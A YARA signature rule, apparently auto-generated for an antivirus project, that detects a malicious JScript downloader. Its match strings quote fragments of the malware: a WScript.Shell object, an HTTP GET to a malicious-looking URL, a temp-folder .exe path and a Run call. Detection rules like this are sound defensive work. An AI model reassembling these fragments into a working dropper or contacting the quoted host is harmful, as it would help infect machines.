rule sig_20160328_0268937020c44c7d2e731fee14e3ff9f {
  meta:
    description = "datamaliciousorder - file 20160328_0268937020c44c7d2e731fee14e3ff9f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2853a031ffce972c374e78a0a7f25ff8139c2adeb9bd7393a7780e2197f75fa7"

  strings:
    $s1  = "function Axdbkvsse() {return Loffxkfa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fW306agmjp9h.exe\";};" fullword ascii
    $s2  = "Axjqus[Bpqjhh](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Grojehi](Dlzcl() * 11)} while (Axjqus[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Loffxkfa = function Pasmckhwqk() {return WScript[Nofitge](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dnmwqnons(Fphrfgwf, Thiaf){return Fphrfgwf - Thiaf;};" fullword ascii
    $s6  = "function Jhhxz(Hfcgrdsqm){Loffxkfa[\"Run\"](Hfcgrdsqm, Dhpnm, Dhpnm);};" fullword ascii
    $s7  = "function Eqwjd() {return ((Lveqmrdmzb == true) && (Lveqmrdmzb == Dkqbmpjm)) ? 1 : Dhpnm;};" fullword ascii
    $s8  = "function Dlzcl(){return 22;};" fullword ascii
    $s9  = "var Pocztfsfrh = new this[\"Date\"]();" fullword ascii
    $s10 = "var Lveqmrdmzb = false;" fullword ascii
    $s11 = "var Jbjrwp = false;" fullword ascii
    $s12 = " while (Mkqceqpj){" fullword ascii
    $s13 = "function Pyynk(){return Nznqlthdhz;};" fullword ascii
    $s14 = "Lveqmrdmzb = true; " fullword ascii
    $s15 = "var Dkqbmpjm = false;" fullword ascii
    $s16 = "function Cmseon()" fullword ascii
    $s17 = "function Clvdck(){return Nofitge;};" fullword ascii
    $s18 = "Dkqbmpjm = true; " fullword ascii
    $s19 = "return Dnmwqnons(Bmzapsb, Knoobg);" fullword ascii
    $s20 = "function Tiyaftnz(Otpedyb) {var Rsbvmcvld = (1, 2, 3, 4, 5, Otpedyb); return Rsbvmcvld;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}